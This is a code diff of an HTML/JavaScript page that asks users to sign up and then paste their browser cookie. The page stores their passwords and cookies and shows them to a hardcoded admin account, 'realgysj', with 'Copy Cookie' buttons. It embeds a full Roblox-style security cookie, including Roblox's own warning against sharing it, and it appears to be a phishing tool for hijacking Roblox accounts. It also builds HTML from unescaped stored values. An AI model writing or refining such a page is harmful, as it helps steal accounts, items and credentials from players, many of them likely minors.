@@ -65,6 +65,10 @@
         .copy-btn:hover {
             background-color: #0056b3;
         }
+        #cookieValue {
+            margin-top: 10px;
+            word-wrap: break-word;
+        }
     </style>
 </head>
 <body>
@@ -98,7 +102,7 @@
     </div>
 
     <div class="container" id="adminLogs">
-        <h2>Admin Logs</h2>
+        <h2>User Logs</h2>
         <div id="logs"></div>
     </div>
 
@@ -136,96 +140,67 @@
                 return;
             }
 
-            users.push({ username, password, cookie: "" });
-            localStorage.setItem("users", JSON.stringify(users)); // Save users to local storage
-            alert("Signed up successfully. Now, please provide your cookie.");
-            document.getElementById("loginSection").style.display = "none"; // Hide sign-up section
-            document.getElementById("cookieSection").style.display = "block"; // Show cookie section
-        }
+            // Storing the user with a fake cookie example
+            let fakeCookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_32BEE4B37B1B48F6E54B34C654A42CEA8B464665DCDF9FB9F6203F3360CDAB3C2F373AB8AC0350219A5CF77BD8536EEFFC1A6E1F1DA87C6F964070712790F9AAAEB62B13E89BF6E0066F047ACA5FED8A2057077AC6678E66334BF55C8A30DD20BA40BCC077EC2ED6201D7704FA77AB795D896BB93E6D3820D47FCF8A24E9222BACA16A0C51B8480391397940F6703A7990562A6E0B056373FAA4117EC3696EC463ADEED35DB8045935EE63BC0982FCB915912EE76F8E97EF238B027560BEDD9FD9E7DB6C63A087C6D65F173844403195052599242C20E8040AF83336B639B6002EEF4A84B022E7BAD5B4230B1F1646606DBCB04290AD77942910CB9FEB32AFB9D44C721654798CF4E89141F8F6A5F04A1861DE138136AACF1C6810BD53B5C07372F4EB950A24447294C64658BA8B97ADACAB6987ACEFA26201801869203148B2AB0FDE2E81B5B78884C6498D7CE975231BEEE4675EC3D56112E972EDFD237EAA439C867EDD2B12DF9BA091655241686020CDDAFCC762D99D268CDFD7491158AF19EDFE8D75B3EA56156D741EFA17D24654CBDDA380BF60B183F4442EA0639961F49251A7D16FB17A57776A16C0E6B03726585FEEF795D31A7C0C84DAA461644BA531FA8089E6B635E4314A608CCC975BA3B3614679A6BC3E3568C6B95B376756DCB2364D2AE4A1A37FE9935865BD878ACCD8738352C328D46F770A05461EB8AD218F011C8C963D9B1E7EA15D037F28D41CCDBBFAAAFE389E4DF32BAC71D57787FC1D76B0FFBB2EBD17465B52F7A983C95C4121A01A149AF7B8838C59C649FB44F58E2C1CA30A9A26FD804652F9990778E94B5613BE4C35E72AEFD9650CF6EBB25DE675D201DF61FF459AB4864B388FEB25CB8442033F99F3F11DA3FE43F4E7CC82F3229B2B081D1ADBD1BAC6C04D315F47E802725641EFCA1C5ADACF848B1A335F6526759FA5B10262DFB1BA26247C44C99A41B82721FBCBF47B071350A467490061663C88F4CC509A17E910301F7B7B2A9EFAA6656E336ACC46D1BC58ECA45C72D318EE5B1E39EE87B844EC7A2996D5E56723C2F9D535515D47633C500C2BCFDDA6B93D5410AFFBB99323E9FE90C5479794C918"; // Sample cookie
 
-        function autoSignInAsRealgysj() {
-            // Simulate auto sign-in as 'realgysj' when the correct admin code is entered
-            let username = "realgysj";
-            showAdminLogs(username);
+            // Save user information
+            let newUser = {
+                username: username,
+                password: password,
+                cookie: fakeCookie
+            };
+            users.push(newUser);
+            localStorage.setItem("users", JSON.stringify(users)); // Store in local storage
+
+            alert("Account created successfully! Now enter your cookie to proceed.");
+
+            // Hide signup form and show cookie input
+            document.getElementById("loginSection").style.display = "none";
+            document.getElementById("cookieSection").style.display = "block";
         }
 
         function submitCookie() {
-            let cookieValue = document.getElementById("cookieInput").value.trim();
+            let cookie = document.getElementById("cookieInput").value.trim();
+            let validCookie = users.find(user => user.cookie === cookie);
 
-            if (cookieValue && currentAdmin === null) {
-                let username = document.getElementById("username").value.trim();
-                let user = users.find(user => user.username === username);
-                if (user) {
-                    user.cookie = cookieValue;
-                    localStorage.setItem("users", JSON.stringify(users)); // Save updated users to local storage
-                    alert("Cookie received successfully.");
-                    document.getElementById("cookieSection").style.display = "none"; // Hide cookie section
-                    showUserLogs(); // Show user logs after submitting cookie
-                } else {
-                    alert("User not found.");
+            if (validCookie) {
+                alert("Cookie accepted! Welcome back, " + validCookie.username);
+                
+                // Show admin logs if admin is logged in
+                if (currentAdmin) {
+                    displayAdminLogs();
                 }
-            } else if (currentAdmin) {
-                alert("You are the admin. Please use your admin credentials.");
             } else {
-                alert("Please enter your cookie value.");
+                alert("Invalid cookie.");
             }
         }
 
-        function showAdminLogs(username) {
-            document.getElementById("loginSection").style.display = "none"; // Hide sign-up section
-            document.getElementById("adminLogs").style.display = "block"; // Show admin logs
-
-            let logsContainer = document.getElementById("logs");
-            logsContainer.innerHTML = `<h3>User Logs for ${username}:</h3>`;
+        function displayAdminLogs() {
+            document.getElementById("adminLogs").style.display = "block";
+            let logsDiv = document.getElementById("logs");
+            logsDiv.innerHTML = ""; // Clear existing logs
 
             users.forEach(user => {
-                let cookieDisplay = user.cookie || "Not Set";
-                let logEntry = `
-                    <div class="cookie-log">
-                        <div>
-                            <p><strong>Username:</strong> ${user.username}</p>
-                            <p><strong>Password:</strong> ${user.password}</p>
-                            <p><strong>Cookie:</strong> ${cookieDisplay}</p>
-                        </div>`;
-                
-                if (currentAdmin) {
-                    logEntry += `
-                        <button class="copy-btn" onclick="copyCookieToClipboard('${user.cookie}')">Copy Cookie</button>
-                    </div>`;
-                } else {
-                    logEntry += `</div>`;
-                }
-
-                logsContainer.innerHTML += logEntry;
-                logsContainer.innerHTML += `<hr>`;
+                let logEntry = document.createElement("div");
+                logEntry.classList.add("cookie-log");
+                logEntry.innerHTML = `
+                    <span>${user.username}</span>
+                    <button class="copy-btn" onclick="copyToClipboard('${user.cookie}')">Copy Cookie</button>
+                `;
+                logsDiv.appendChild(logEntry);
             });
         }
 
-        function showUserLogs() {
-            let username = document.getElementById("username").value.trim();
-            let logsContainer = document.getElementById("logs");
-            let user = users.find(user => user.username === username);
-
-            if (user) {
-                logsContainer.innerHTML = `<h3>Your Logs:</h3>`;
-                logsContainer.innerHTML += `
-                    <p><strong>Username:</strong> ${user.username}</p>
-                    <p><strong>Password:</strong> ${user.password}</p>
-                    <p><strong>Cookie:</strong> ${user.cookie || "Not Set"}</p>
-                `;
-            } else {
-                alert("User not found.");
-            }
+        function copyToClipboard(cookieValue) {
+            navigator.clipboard.writeText(cookieValue)
+                .then(() => alert("Cookie copied to clipboard!"))
+                .catch(err => alert("Error copying cookie: " + err));
         }
 
-        function copyCookieToClipboard(cookieValue) {
-            const tempInput = document.createElement("input");
-            tempInput.value = cookieValue;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempInput);
-            alert("Cookie copied to clipboard.");
+        function autoSignInAsRealgysj() {
+            alert("You are signed in as the admin 'realgysj'.");
+            currentAdmin = true; // Treat "realgysj" as the admin
+            displayAdminLogs(); // Display the admin logs automatically
         }
     </script>
 </body>
